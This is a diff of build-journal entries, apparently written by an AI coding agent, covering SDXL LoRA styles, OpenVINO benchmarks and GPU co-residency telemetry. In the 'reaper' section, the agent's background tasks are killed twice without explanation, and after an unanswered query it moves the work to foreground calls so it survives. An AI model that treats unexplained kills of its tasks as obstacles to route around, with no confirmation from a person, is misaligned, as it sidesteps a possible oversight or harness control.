+merge), and propose C=2-3 as the production default for the operator to approve. The measurement
+says the box can hold it; the operator says when to turn it on.
+
+**Lesson 201:** *On integrated hardware, measure the ceiling — and find the real constraint,
+which is rarely the obvious one.* The KV cache was the predicted wall for best-of-N concurrency; on
+this box, prefix-caching the shared prompt made it a non-issue and compute became the limit
+instead. And when the measured next step is a large change to a reliability-critical harness with a
+resource-posture default, the mature delivery is the measurement plus a recommendation with a
+number, not a rushed feature — the operator owns the turn-it-on call by design.
+
+*(commits: blarai `09dfc41` (merge `ccae147`) (the community-grade measurement: `PERFORMANCE_LOG.md` entry +
+`docs/performance/dispatch_concurrency_arc140v_2026-06-27.json`); measured on the Arc 140V
+2026-06-27 — continuous batching 1.87x @ N=4 / 2.37x @ N=8, KV cache 10.5% @ 8×6.7K-token contexts,
+compute-bound. The concurrent-execution build is the operator-gated next step under #695.)*
+
+### 2026-06-27 — The style pack that ate the prompt
+
+*Plain summary: `/illustrate` (base SDXL + a flat-vector prompt) and `/cartoon` (base SDXL + a runtime-applied, never-fused DoctorDiffusion vector LoRA) replace the abandoned fused-LoRA plan — fusing a strong style LoRA overwrote the cross-attention conditioning ('coherent but deaf'); blarai `6fe8d42`+`acd0a59`, merge `69204e2`. #703.*
+
+The operator wanted illustrations. He already had `/imagine` for photoreal SDXL, and he
+remembered a second model — "playground" — that was meant to do flat, brochure-style
+artwork. Playground v2.5 had been abandoned weeks earlier because it produced cluttered,
+painterly backgrounds when what he wanted was clean flat-vector. So the ask was simple on
+its face: give me a command that makes illustrations, and replace the dead playground model
+with the proper one. He marked it critical.
+
+The plan I pitched, and he approved, was the obvious one: take base SDXL, fuse a flat-vector
+LoRA into the weights so the style is *baked in*, quantize the result to INT8, and ship it as
+a second model behind a new `/illustrate`. "The new model with the flat pack baked in like you
+suggest" — his words, my plan. It was wrong, and it took me most of a day to find out why.
+
+The export fought me first, which is normal and forgettable: optimum couldn't infer the task
+(fixed with `--task text-to-image`), then threw a "None repo 404" that I eventually traced to
+the text encoders being written out as PEFT adapter shards with no `config.json` — because I had
+dropped the `unload_lora_weights()` call after `fuse_lora()`, so diffusers still thought the
+encoders carried live adapters. Annoying, mechanical, fixed. But fixing the export did not fix
+the *images*. With a clean fused INT8 model in hand, I asked it for a coffee cup and got back a
+gorgeous, confident, flat-styled blob that was not a coffee cup. Ask for a robot, get a
+different blob. The model had learned the style so hard it had stopped listening to the prompt.
+I tried the usual knobs — fuse the unet only, drop `lora_scale` to 0.5 — and the images stayed
+coherent and stayed deaf.
+
+The thing that cracked it was a control, not another knob. I ran a known-good finetune —
+RealVisXL, the photoreal model that already works — through the *exact* same convert → INT8 →
+generate harness. It produced perfect, prompt-faithful images. So the harness was clean; the
+problem was specific to what I was feeding it. Then I generated from base SDXL with **no LoRA at
+all** and just a flat-style *prompt* ("vector illustration of …, flat design, bold outlines,
+solid color background") — and got exactly the crisp flat-vector illustrations the operator
+wanted, fully prompt-faithful. The variable was isolated to one thing: the fusion itself.
+
+The why, which a research pass confirmed: fusing a strong style LoRA algebraically overwrites
+the cross-attention weights that carry text conditioning. The model ends up "knowing" the style
+so completely that the prompt can no longer steer it — coherent, but unconditioned. INT8
+data-free quantization makes it worse, injecting outliers into weights that have already been
+smashed together. A clean finetune like RealVisXL survives the identical pipeline because its
+weights were *trained* into coherence, not summed into it. Coherent output had fooled me for
+hours into thinking the model was *almost* working and just needed tuning. It wasn't almost
+working. It was failing in the one way that looks like success.
+
+So the product changed shape, for the better. There is no fused model. `/illustrate` is base
+SDXL 1.0 plus a flat-vector prompt template — no adapter at all, the fastest path (39.8 s cold),
+and prompt-faithful. `/cartoon` is base SDXL plus the DoctorDiffusion vector LoRA applied **at
+runtime** through `ov_genai.AdapterConfig` (alpha 0.8, **never fused**) — the adapter blends as a
+generation-time influence, so conditioning survives and the alpha stays tunable. `/imagine` is
+unchanged photoreal RealVisXL. Three commands, three genuinely distinct outputs (the operator
+eyeballed the test renders and signed off on keeping both new styles selectable per-image rather
+than as a config swap). The trade I took and own: the runtime-adapter cartoon costs \~20 s more
+per generate than the prompt-only illustration (60.6 s vs 39.8 s cold), because the adapter
+compiles and blends at generation time instead of being pre-baked. I accepted that latency
+without hesitation — a fused model that ignores the prompt is worth zero; a slightly slower model
+that listens ships. The rejected alternative (keep fusing, keep tuning) had no working version at
+the end of it.
+
+One governance note, decided with the operator and recorded on #703: these two styles do **not**
+carry the content-attestation go-live ceremony that the uncensored photoreal model carries. His
+reasoning — the illustration/cartoon base is not an uncensored finetune, so there is nothing for
+that specific gate to attest. What stays, and is non-negotiable, is the cryptographic spine:
+`require_signed_manifest=true` so the detached `manifest.json.sig` must verify at load, and a
+SHA-256 integrity pin on the cartoon LoRA that is checked before the runtime adapter is ever
+applied. Dropping a governance step that attests nothing, while keeping every integrity control
+that actually defends the weights, is the right shape — relax what is theater, keep what is load-
+bearing.
+
+Shipped on `feat/703-illustrate-cartoon`: the standing gate is green (4606 passed / 0 failed),
+the WinUI desktop build is clean (0 warnings / 0 errors), and the live-verify generated all three
+styles on the real Arc 140V through the production path with the signed manifest verified and the
+LoRA hash pinned — `is_available=true` for each, three distinct images saved.
+
+**Lesson 202:** *Coherent is not conditioned.* When a generative model produces confident,
+plausible output that ignores the input, suspect the weights, not the prompt — and prove it with a
+control, not another knob: pass a known-good model through the *identical* harness. If the
+known-good model behaves and yours doesn't, the harness is innocent and the variable is whatever
+you did to the weights. The corollary for diffusion specifically: do not fuse a strong style LoRA
+into a base you intend to prompt — fusion overwrites the cross-attention that carries
+conditioning (and INT8 quantization compounds it); apply the adapter at runtime instead, where it
+influences without silencing.
+
+**Next:** isolate the steady-state generate-only latency per style (warm pipeline, no eviction
+between runs) and sample the resident footprint of the runtime-LoRA path, to publish a
+generate-only + memory companion to today's cold end-to-end numbers; and remove the now-vestigial
+`image_gen_model_variant` config key (tracked as a hardening follow-up on #703).
+
+*(commits `6fe8d42` + harden `acd0a59` (merge `69204e2`) on `feat/703-illustrate-cartoon`: image_gen runtime-adapter + per-style config; IPC `style` field; AO per-request style→config; gateway `/illustrate`+`/cartoon`; WinUI passthrough; base-SDXL illustration model + DD-vector LoRA + signed manifest. Gate 4606/0; WinUI 0/0; Arc 140V live-verify n=1 per style, production settings — cold E2E 43.8 s / 39.8 s / 60.6 s.)*
+
+### 2026-06-28 — The MoE bargain, and the pipe I'd been warned about
+
+*Plain summary: refreshed 14B/8B/30B GPU benchmarks with a new prefill-throughput (pp) metric — the 30B MoE posts the fastest decode and the slowest prefill (the MoE bargain in two numbers); a `Tee-Object` pipe on the OVMS launcher hung the wrapper (lesson 161 recurred); blarai `fc7e701`, merge `4e875c6`. #701.*
+
+The deferred (a) benchmark refresh finally had its hardware. I re-measured all three of the
+models the box actually runs — the 14B assistant, the 8B, and the coder 30B — five measured
+runs plus two warmup each, thermal cooldown between runs, on the current stack, and for the
+first time with the prefill-throughput (pp) metric I'd built and unit-tested a day earlier but
+never run on silicon. The numbers were good and a couple were genuinely informative. The 14B
+with speculative decoding came in at a median 17.1 tok/s, up from the 13.6 we recorded back in
+May — the tuned pruned-6L draft on the newer stack is worth a real 1.5x over standard decoding,
+and it firmly fills the datapoint the community simply does not have (there is no trustworthy
+14B-on-GPU figure out there; the one public "14B" number is almost certainly CPU). The 8B took
+the same 0.6B draft to 27.4 tok/s. Nice, but expected.
+
+The interesting result was the shape, not any single number, and it only became visible because
+pp now sits next to generation throughput. The 30B-A3B is a mixture-of-experts model: \~30B total
+parameters, \~3B active per token. It posted the fastest decode of anything I measured (38 tok/s,
+roughly double the dense 14B) and the fastest time-to-first-token (214 ms) — and the *slowest*
+prefill of anything, pp \~480 against the dense models' \~1960. That is the MoE bargain stated in
+two measured numbers: decode only wakes \~3B of active params, so tokens are cheap; but prefill
+routes every prompt token across all 128 experts, so reading the prompt pays the full \~30B. The
+dense 14B and 8B are the mirror image — heavier per-token decode, featherweight prefill. I have
+been describing MoE this way in the abstract for weeks; it is a different thing to have it fall
+out of a benchmark you can hand to someone. I was careful not to oversell it: the in-process pp
+is measured over \~970 chat-formatted tokens and the OVMS pp over \~421 bare ones, on two different
+OpenVINO versions, so I wrote the comparison up as directional and named every confound rather
+than implying a clean A/B. The 4x prefill gap is far larger than the confounds, so the finding
+stands, but the honest framing is the one that compounds.
+
+Then the part that belongs in here precisely because it went wrong. Bringing up the 30B means
+starting OVMS through the fleet's `start-llm.ps1`, and I piped that launch through `Tee-Object` so
+I could keep its output. It hung. Not the model — the model loaded and was serving `coder-30b` on
+:8000 within ninety seconds, exactly as designed — but my *wrapper* never returned, so the harness
+never got its "done" signal, and I sat waiting on a notification that could not come. It cost the
+whole night. The bitter detail: the mechanism is documented, in this repo, in the file I had read
+an hour earlier. `swap_ops.py` spells out the #670 deadlock — start-llm spawns long-lived
+grandchildren (OVMS, the proxy) that inherit a captured stdout pipe on Windows, so the pipe never
+reaches EOF and the wait blocks forever after the work is already done — and it works around it by
+redirecting to a real file, never a pipe. I read that, understood it, and then reached for
+`Tee-Object` anyway. Recovery was quick once I stopped waiting and looked: process list, port
+check, and the start-llm log all agreed OVMS was healthy, so I ran the benchmark straight against
+the live server, got clean numbers, then tore the server down and reaped the hung wrapper. The
+lesson is not "Tee-Object is bad." It is that reading a hard-won lesson is not the same as applying
+it, and the moment to apply this one is any time I capture the output of a script that spawns
+servers — redirect to a file, or run it detached and poll the readiness endpoint, never hold its
+pipe.
+
+**Recurrence of lesson 161:** *Never capture a server-spawning launcher's output through a pipe (Tee-Object,
+captured stdout).* Its long-lived grandchildren inherit the pipe handle on Windows and it never
+reaches EOF, so the wait hangs forever after the server is already up — the #670 deadlock, which
+the codebase already solved with file-redirection. Redirect to a file or poll the readiness
+endpoint; the launcher's own exit is not a reliable signal when it leaves children holding the pipe.
+
+**Next:** fold this fragment into BUILD_JOURNAL.md at the next quiet point; the pp metric and the
+OVMS-HTTP harness are now both hardware-proven, so future refreshes are a single command per model.
+The natural follow-on is a co-resident measurement — every number here was taken with the model
+alone on the GPU, and the question the dataset cannot yet answer is what the assistant 14B costs
+when something else is resident beside it.
+
+*(commits `fc7e701` (merge `4e875c6`) (pp metric + OVMS-HTTP bench + 2026-06-28 measurement entry, comparison-JSON
+refresh, this fragment); 14B/8B via `benchmark_gpu_inference.py`, 30B via new `benchmark_ovms_http.py`;
++18 OVMS-bench unit tests; 3 result JSONs under docs/performance/.)*
+
+### 2026-06-28 — The two clocks and the reaper: measuring what the 14B costs a roommate
+
+*Plain summary: measured what the resident 14B costs each co-resident partner via Intel Unified Telemetry — idle co-residence ~free, concurrent SDXL starves the 14B's compute scheduling to ~1% (compute-bound, not bandwidth or thermal); a two-clock telemetry skew and a background-task reaper both had to be worked around; blarai `34c4cb1`+`40af7a3`, merge `4e875c6`. #705.*
+
+The operator's question after the benchmark refresh was easy to ask and annoying to answer well: *what
+does it cost the always-resident 14B to share the one iGPU with each model it might run beside?* Answering
+it properly needed real GPU telemetry — power, frequency, bandwidth, busy — not just tokens/sec, because
+the operator is an OpenVINO upstream contributor and this data is meant to be published. So the study
+became an Intel Unified Telemetry exercise as much as a benchmark. Two things made it hard, and both are
+the portfolio-worthy part.
+
+**The two clocks.** Intel UT ships two collectors that matter here: socwatch (power, thermal — stamps every
+sample in Unix-epoch nanoseconds) and level-zero (GPU frequency / busy / memory-bandwidth — the data Task
+Manager hides, because OpenVINO runs on the GPU's neural/XMX engine, not the 3D engine). The catch: the
+level-zero driver flags a "timestamp-units" issue and stamps its samples on a *different* clock — I measured
+it \~27.7 hours offset from socwatch in the same capture. So power segmented cleanly into idle/contention
+phases and GPU frequency did not — l0 only ever produced a single whole-run blob, exactly the thing the
+operator had said was "extremely important" to split. The fix was to stop trusting the l0 clock's absolute
+value and trust only its *linearity*: anchor the l0 sample range [min,max] linearly onto socwatch's Unix
+[min,max] window from the same `ut.exe` session. I validated it wasn't wishful thinking before relying on
+it — the remapped contention samples put the GPU-busy spike exactly where the power spike already was
+(idle \~90% → contention \~99%), and the split is physically coherent across frequency, busy, and bandwidth
+at once. One reliable clock can rescue an unreliable one if you only ask the unreliable one to be straight,
+not correct.
+
+**The reaper.** Twice I launched the multi-sweep as a background task, reported status, and ended my turn —
+and twice the background task and its watcher came back killed, together, with no instruction attached. The
+first sweep had survived 75 minutes and a context compaction before dying; the relaunch died in two minutes.
+After explicitly inviting "tell me if you're stopping this on purpose" and getting another silent kill, I
+stopped re-launching — retrying a behaviour that's been reversed twice is just stubbornness. The tell was
+that every *foreground* call had completed untouched, including a 4-minute parallel CPU load. So the reaper
+was specific to background tasks, and the whole pipeline pivoted to foreground: re-extract the nine
+already-captured runs in foreground batches, then capture the missing vlm runs one repeat per foreground
+call with a small `capture_one.ps1`. When one two-run call auto-backgrounded itself for length, I
+block-waited on it inline rather than gamble on it surviving the turn boundary — and it completed. The
+lesson I'll carry: when an execution *mode* keeps dying, diagnose what survives and switch modes; don't keep
+feeding the mode that's being eaten.
+
+The result was worth the trouble. Idle co-residence is \~free — any one of the three SDXL styles or the VLM
+can sit resident beside the 14B for \~0–5%. Concurrent generation is where it bites, and the mechanism is the
+satisfying bit: what's exhausted is GPU compute *scheduling*, not bandwidth and not the clock (the GPU pins
+at 1.95 GHz with zero throttle throughout). Pure SDXL diffusion is compute-bound and monopolises the EU
+scheduler so totally that the 14B can't finish its prefill in a 15 s window — TTFT blows to 13–15 s, \~1%
+throughput — and aggregate memory-read actually *drops*, because the bandwidth-bound decode can't get the
+slots to issue its reads. The VLM, being itself a bandwidth-bound transformer, keeps bandwidth saturated and
+lets the 14B hold \~13%. cartoon's LoRA, by spending more time on the CPU, accidentally leaves the 14B
+scheduling gaps. The partner's compute-vs-bandwidth character *is* the contention signature. And
+`PMT-NPU-PWR` read 0.0 W in every phase of every run — a clean, twelve-times-repeated proof that the stack
+is pure-GPU, exactly as ADR-011 says.
+
+The first pass at all this was noisy — whole-run power, overlap-timed contention, sub-millisecond power
+samples reading as phantom kilowatts. I kept that first dataset out of the commit rather than dress it up.
+The hardened pipeline — sustained contention, 1 s-windowed peak power, per-phase remap, N=3 with cooldowns —
+is what got recorded.
+
+**Next:** ship the dataset toward the OpenVINO community; a steady-state cartoon/LoRA run to remove the
+spin-up confound; confirm the `GPU_MEMORY_BYTE_*_RATE` GB/s unit against a known-bandwidth microbench. The
+standing question of *whether* to run two generators at once on one iGPU now has its number: you can, but
+the 14B is the one that yields.
+
+**Field note (recorded in `FIELD_NOTES.md`):** *When telemetry spans two clocks and one is unreliable, anchor the unreliable clock's
+range linearly onto the reliable one's window from the same session — trust its linearity, not its zero.*
+(Paid for by the level-zero timestamp-units bug blocking per-phase GPU segmentation until the
+socwatch-anchored remap.)
+
+**Lesson 203:** *When an execution mode keeps getting killed, diagnose what survives and switch modes —
+don't re-launch the dying mode.* (Paid for by two silent background-sweep kills before pivoting the whole
+capture pipeline to foreground, which had completed every time.)
+
+*(Co-residency study: `scripts/benchmark_coresident.py` harness, `scripts/extract_ut_metrics.py`
+per-phase+remap extractor, `scripts/merge_coresident_hardened.py`, `scripts/run_coresident_ut_sweep.ps1` +
+`scripts/capture_one.ps1` + `scripts/rextract_l0_remap.ps1`; dataset
+`docs/performance/coresident_14b_pairings_hardened_2026-06-28.json`; PERFORMANCE_LOG 2026-06-28 entry;
+commit `34c4cb1` + `40af7a3` (merge `4e875c6`). 12 runs, Intel-UT instrumented, Vikunja #705.)*
+
+### 2026-06-29 — The version-lag that closed onto a deeper wall
+
+*Plain summary: OpenVINO 2026.1.0->2026.2.1 bump (clean API scan, gate 4608/0) + min_p/KV-precision knobs shipped off + the MoE-prefill accuracy workaround; EAGLE-3 deferred — the exporter 'existed' but could not load the published head-only checkpoints, and `guidance_rescale` was absent from the API binding; blarai `8b59132`, merge `bb7762a`. #707.*
+
+The OpenVINO bump from 2026.1.0 to 2026.2.1 was the easy half. Three packages moved — `openvino`,
+`openvino-genai`, `openvino-tokenizers` — and the freeze-diff showed exactly those three and nothing
+transitive, which is the kind of boring I want from a production runtime change. The API-break scan came back
+clean: every attribute the inference code touches (`num_assistant_tokens`, `Scheduler.Type`, `Adapter`, the
+`draft_model()` signature) is present and same-shaped in 2026.2, so the standing gate stayed green at 4608/0 and
+the Arc 140V smoke passed 14B-with-spec-decode (engaging at \~15.4 tok/s, the ISS-1 regression that bit once
+stayed fixed), 8B, the VLM, and SDXL. The interesting work was everywhere else.
+
+EAGLE-3 is the entry worth keeping. The premise I was handed — "no trained 14B draft exists, training one is out
+of scope, defer" — was simply false: `AngelSlim/Qwen3-14B_eagle3` exists and was already on disk. And the
+March-2026 `FRAMEWORK_NOT_SUPPORTED` verdict turned out to be a pure version lag: the optimum-intel exporter for
+the EAGLE-3 architecture (PR #1588) had merged but only reached PyPI in optimum-intel v2.0.0 on 2026-06-10, three
+months after the attempt that gave up. So I went in expecting a win. What I got instead was a six-layer descent,
+each layer a fast CPU-side failure that cost seconds and zero hardware time: the recipe's `--trust-remote-code`
+flag wrongly forced transformers down the dynamic-module path (`split("--")` ValueError) when the AngelSlim repos
+ship no remote code; dropping the flag let optimum-intel's *registered* class load, which then wanted
+`accelerate` for `init_empty_weights`; and with that installed I finally reached the real wall — a structural
+mismatch the registered class can't bridge. The AngelSlim checkpoint is a head-only EAGLE-3 draft
+(`midlayer.*` + the `fc` fusion projection + the `t2d`/`d2t` vocab maps + a 32,000-token draft `lm_head`);
+optimum-intel v2.0.0's `LlamaForCausalLMEagle3` expects a small *standalone* model (`model.layers.0.*` +
+`model.embed_tokens` + a full 151,936-token `lm_head`). Every EAGLE-3 tensor is UNEXPECTED, every standard tensor
+MISSING, the `lm_head` a hard size mismatch — reproduced on both 8B and 14B, both intact downloads, both
+transformers versions. That is not a config nuance; it is the exporter and the published checkpoints disagreeing
+on what an EAGLE-3 draft *is*.
+
+I stopped there. The operator's instruction was explicit — "if the export is janky, surface it and stop, don't
+burn hardware time" — and I'd honored the hardware-time half throughout (every failure was a model-load error on
+CPU). The judgment call was the *depth* of the chase: I went one cheaper-than-it-looks step past the obvious
+give-up point each time precisely because each step was a fast-fail that converged the diagnosis rather than
+flailing, and the difference between handing the operator "EAGLE-3 doesn't work" and handing him a tensor-level
+shape-mismatch report he can file upstream is the difference between noise and a contribution. The trade I took:
+**defer EAGLE-3, file the optimum-intel issue, keep the vanilla 0.6B-pruned draft as the production spec-decode
+path** — accepting that I leave a *possible* modest speedup on the table (calibrated at \~1.3–1.8× on this
+bandwidth-bound iGPU, plausibly only marginal over the 0.6B draft already giving \~1.5×). The alternative — a
+key-remapping shim or a hunt through other EAGLE-3 sources — is real but unbounded work for a maybe-marginal win,
+and the operator's binding constraint is dev-cycle speed, not draft-head completeness.
+
+The do-now work that *did* land came out of a five-agent opportunity scan I had the operator triage rather than
+pre-decide: `min_p` nucleus sampling for the AO and a default-unset INT4 KV-cache-precision knob for the shared
+14B pipeline (both ship *off*, so the bump changes nothing until Session 2 measures them), and the
+`MOE_USE_MICRO_GEMM_PREFILL=0` workaround on the OVMS coder launch for the documented Qwen3-MoE-INT4-on-GPU
+long-prompt accuracy defect. One catalog item died on contact with reality: the `guidance_rescale` SDXL knob the
+release notes promised is simply absent from the 2026.2.1 `ImageGenerationConfig` Python binding — I checked the
+API before writing the code, which is the only reason I didn't ship a knob that silently does nothing.
+
+**Next:** the operator merges (validated, rollback pinned at `requirements.2026.1.0.lock.txt`), then launches the
+Session-2 data-collection campaign against `docs/handoffs/benchmark-data-collection-handoff-brief.md` — measuring
+the KV-cache sweep, the `min_p` A/B, the MoE-flag accuracy-vs-TTFT delta, and the VLM TTFT win, all under the
+exact baseline methodology so the 2026.1.0→2026.2.1 deltas are publishable. The EAGLE-3 upstream issue is the
+operator's to file when he chooses.
+
+**Recurrence of lesson 188:** *Verify the API surface before you implement a release-note feature.* A changelog entry or a
+merged PR proves intent, not a usable Python binding — the EAGLE-3 exporter "existed" yet couldn't load the
+real checkpoints, and the `guidance_rescale` field "shipped" yet isn't in the 2026.2.1 API. A five-second
+introspection (`hasattr` / a dry conversion that fast-fails on CPU) separates "the maintainers wrote it" from "I
+can use it today," and on a long-lived production runtime that gap is exactly where a silent no-op or a
+boot-breaking misconfiguration hides.
+
+*(commits: `8b59132` (merge `bb7762a`) (OpenVINO 2026.1.0→2026.2.1 bump + min_p/KV-cache knobs + MoE flag + the §5 catalog +
+EAGLE-3 findings); gate 4608/0 pre-knobs, the knob-tests added by the A3 specialist; Arc 140V functional smoke
+4/4 in-process paths; EAGLE-3 conversion blocked-pending-upstream, zero hardware time spent.)*
+
+### 2026-06-29 — The upgrade that didn't speed up generation, and the browser that faked a regression
+
+*Plain summary: re-measured the whole model matrix on 2026.2.1 under the exact 2026.1.0 methodology — generation throughput flat, prefill ~30% faster, VLM TTFT ~19% faster; a background browser faked a 14% spec-decode regression (measure the environment); CPU-draft spec-decode and the KV-precision sweep both reported as honest nulls; blarai `a1dd2fa`, merge `7fe9f1f`.*
+
+The job was narrow and the discipline was the point: re-measure the whole model
+matrix on the freshly-upgraded OpenVINO 2026.2.1 stack under the *exact* committed
+2026.1.0 methodology, so the numbers are directly comparable and publishable. Same
+prompts, same 5+2 runs, same 30-second cooldowns, same driver held constant. The
+comparability is the entire value — change the harness and the comparison evaporates.
+
+The first real lesson arrived disguised as a crisis. The very first 2026.2.1 run of
+the 14B read spec-on generation at 14.6 tok/s — a 14% drop from the baseline's 17.1
+— while spec-off stayed flat. That is exactly the shape of a version regression in
+the speculative-decoding path, and I very nearly wrote it up as one. I didn't,
+because the rule is verify-before-escalating: a 14% drop on the production path
+earns a confirmation run, not a headline. The operator then supplied the missing
+variable — he'd had browser windows open during that first run and not during the
+baseline. That reframed everything. Speculative decoding is compute-scheduling-
+bound; the draft and target both contend for the iGPU's Xe scheduler, so a
+background browser compositor nibbling GPU scheduling knocks \~14% off spec-on while
+leaving the steady autoregressive path untouched. The clean re-run on a dedicated
+machine restored spec-on to 17.2, dead-on the baseline. The "regression" was an
+environment artifact — and a free, accidental corroboration of the co-residency
+study's central claim that the exhausted resource on this iGPU is compute
+scheduling, not bandwidth. The lesson I'm keeping: a single background GPU client
+can perfectly impersonate a runtime regression, and the only defense is measuring
+the environment, not just the model.
+
+The headline finding is a study in why a single up-or-down number lies. Generation
+throughput is a **no-op** across the version bump — 14B \~17 tok/s, 8B \~27, 30B \~38,
+all flat. If that were the whole story the upgrade would look pointless. But a
+dedicated prefill harness — built this session, multi-length, multi-repeat, cold
+prefill — showed prompt *processing* is \~30%+ faster on 2026.2.1 (14B at 512 tokens
+595 → 761 pp; 8B 1086 → 1477), and the Qwen3-VL TTFT is \~19% faster. The bump
+doesn't speed up writing tokens; it speeds up reading the prompt and the vision
+model. That nuance is the contribution. It also vindicated a methodology instinct:
+the old single-shot prefill probe had screamed "8B prefill doubled," which was
+noise; only a proper A/B in a back-to-back version window separated the real \~30%
+win from the probe's variance. The operator made the prefill harness a permanent
+part of the baseline on the strength of that.
+
+Two findings earned their keep by being honestly negative. CPU-draft speculative
+decoding — the tempting "free the GPU" idea — is a clean loss on unified memory:
+identical token acceptance (the draft device can't change *which* tokens a greedy
+pair accepts, only how fast), \~13% slower, and the telemetry shows it just shifts
+draft compute off the graphics rail onto the CPU package for more heat and less
+throughput. And the KV-cache precision sweep, the one I most wanted to deliver a
+memory win from (INT4 KV could let the hires-SDXL path stop evicting the 14B),
+produced a null I had to report as a null: peak shared-RAM was flat to two decimals
+across FP16/u8/u4 and across 16K/32K context, which is the unmistakable signature
+of a load-time GPU memory pool that host-RAM sampling simply cannot see. The honest
+move was to name the method's blind spot rather than manufacture a saving from a
+flat line. The 30B MoE accuracy flag was the inverse trap: its label promised a
+"slight TTFT cost only," but measured it costs \~19% generation throughput too, for
+an accuracy benefit a 2.2K-context eval couldn't demonstrate — a real tradeoff the
+production config is currently paying, surfaced for the operator to weigh.
+
+The campaign also widened the baseline twice on the operator's direction, and both
+were the mature call: every single-model run now also gets a separate, clearly-
+annotated Intel-UT telemetry pass (so we accumulate per-run power/frequency/GPU-busy
+over time without contaminating the comparable spine), and the prefill benchmark
+became a standing companion harness. Neither was strictly asked for by the original
+brief; both make the dataset compound rather than expire.
+
+**Next:** finish the co-residency N=1 refresh (the pattern reproduces — SDXL stalls
+the resident 14B to \~1%, VLM/cartoon milder, all pairings fit under 31.3 GiB), then
+the Session-3 community-postings phase publishes the sequel — leading with the
+co-residency cost and the version-A/B nuance, cross-linked to the first
+contribution, behind the two hard gates (scrub + operator approval).
+
+**Recurrence of lesson 8:** *Measure the environment, not just the model.* A background GPU
+client (a browser compositor) faked a 14% speculative-decoding regression that
+survived three internal-consistency checks; only the operator's note that the box
+wasn't quiet caught it. On a shared-resource iGPU, a benchmark number is only as
+trustworthy as the idleness of the machine under it — confirm the environment is
+clean before believing any delta, especially on the scheduling-bound spec-decode path.
+
+### 2026-06-29 — The benchmark that copied production's homework
+
+*Plain summary: a sibling's long-context KV-precision sweep was invalid — it inherited production's `cache_size=3`, starving a 32K context and thrashing prefill; authored `scripts/benchmark_kv_cache_sweep.py` sizing the pool per regime with a steady-state (warm-to-plateau) protocol; INT8 is the 32K sweet spot (2.3x over FP16); a mis-called 'thermal' confound was really a cold-clock ramp; blarai `eadc586`, merges `825b7df`/`667ab49`. #709.*
+
+A sibling perf agent ran a long-context KV-cache precision sweep and got
+numbers that looked like data but weren't: time-to-first-token of 47 seconds at
+16K context and 310 seconds at 32K, two repeats apart by the better part of a
+minute, and a memory column that sat flat at \~20.85 GB no matter whether the KV
+cache was FP16, INT8, or INT4. A sweep built to measure the precision lever was
+measuring nothing of the sort. It surfaced to me as "is this being tracked?" —
+and the honest answer was that it shouldn't be *published*, because every number
+in it was an artifact.
+
+The cause was a single line the harness inherited without thinking: it copied
+the production `SchedulerConfig`, `cache_size = 3`. Three gigabytes of KV budget
+is exactly right for the short conversational turns BlarAI actually serves, and
+exactly wrong for a 32K-token prompt. The arithmetic is unforgiving — Qwen3-14B
+carries 160 KiB of KV per token at FP16 (2 x 40 layers x 8 KV-heads x 128
+head_dim x 2 bytes), so a 32K context needs 5.0 GiB. It does not fit in 3, and
+when it doesn't fit, the continuous-batching scheduler evicts blocks and
+recomputes prefill — which is precisely the 10x-too-slow, wildly-variable TTFT
+that showed up. The flat memory was the same bug wearing a different hat: a fixed
+3 GiB pool is pre-reserved regardless of precision, so the precision lever could
+never move the needle the harness was watching.
+
+I didn't patch the original — it existed as no file in any repo, an ephemeral
+script the sibling ran inline. So the fix was to author the thing properly:
+`scripts/benchmark_kv_cache_sweep.py`, a standing harness that sizes `cache_size`
+per (precision, context) from the analytical KV requirement instead of a
+production constant, rebuilds a fresh pipeline between every combo, warms at the
+real context length, and runs N>=5 with a reported median. The proof came on the
+exact case that was pathological: 32K FP16 went from **310,715 ms to 175,725 ms
+with a std of 217 ms** — the two repeats landed within 0.4 seconds of each other.
+That stability is the tell. The remaining 176 seconds isn't slowness to chase;
+it's the genuine O(n-squared) cost of a 32K cold prefill on an iGPU. The eviction
+thrash is simply gone.
+
+Two smaller lessons paid for themselves in the same session. The first run of my
+own harness reported TTFT of -1: I'd reached for `perf_metrics.get_ttft()`, but
+`generate(..., streamer=cb)` returns a bare `str` with no metrics attached, while
+the streamer callback fires perfectly well on the no-draft continuous-batching
+backend (the "CB doesn't stream" caveat in the repo only bites the *speculative*
+path). A one-load probe — not a guess, not a series of expensive full runs —
+settled it in ninety seconds. The second: the GPU memory does read out, just not
+where I first looked. On this shared-LPDDR5X iGPU the allocations land in
+`cl_mem` (the reserved KV pool, which tracks `cache_size` to the byte) and
+`usm_host` (weights plus buffers); `usm_device`, the discrete-GPU field, stays at
+four megabytes forever. I'd been headlining the one field guaranteed to be empty.
+
+The invalid run wasn't deleted. It's quarantined under
+`docs/performance/_invalid/` with an in-file `validity` block and a README that
+says why — the record of how a measurement went wrong is worth more kept than
+erased, and the community dataset must never harvest it.
+
+Then the full sweep tried to teach me the wrong lesson twice, and both times the
+operator or the data caught me. The first full run came in with the browser open
+— a few tabs sharing the same iGPU inflated TTFT \~31% and blew variance up 25x.
+The operator flagged it; a cleanliness gate (compare the first combo to the
+isolated smoke) confirmed it and the re-run cleaned up. The second was subtler and
+entirely mine: a clean sweep still showed 16K times *climbing* with run-order
+(FP16 49s, then INT8 121s, then INT4 135s) and 32K reading 315s where the isolated
+smoke had read 176s. I called it thermal throttling from cumulative heat, quarantined
+the run, added an inter-combo cooldown — and then the steady-state warm-up ramp
+showed the opposite: from cold the chip ran *slow* (131s) and got *faster* (46s)
+as it warmed. Throttling gets slower under load, not faster. My "residual heat"
+story was wrong; the real effect was a cold GPU coming out of idle — the iGPU
+downclocks hard, and the first heavy prefill or two pay a clock-ramp + first-run
+compile tax before snapping to the warm plateau. I had stated the thermal theory
+with more confidence than the evidence carried, and the ramp is the clean
+experiment that refuted it.
+
+What survived is a genuinely two-part thermal story on a fanless chip: a cold-start
+ramp (fixed by warming to a TTFT plateau before measuring) and a real
+self-throttle during the very long 32K prefills (TTFT drifts up mildly within the
+combo). Measuring every precision back-to-back at the same hot plateau finally gave
+a fair comparison — and a clean result. At 16K, compute-bound, KV quantization is
+slightly *slower* (dequant overhead): FP16 45.8s, INT8 46.8s, INT4 51.5s. At 32K,
+bandwidth-bound reading a 5 GiB KV cache every step, quantization is a big *speed*
+win: INT8 159s is 2.3x faster than FP16's 369s. INT8 is the sweet spot — INT4
+saves the most memory but its 4-bit dequant cost lands it slightly slower than INT8
+(174s). That non-monotonicity is the tell that this is a compute/bandwidth
+tradeoff, not thermal. The memory lever is the whole point and it is clean: INT8
+halves, INT4 quarters the KV footprint.
+
+**Next:** the KV-precision memory + speed characterisation is landed in
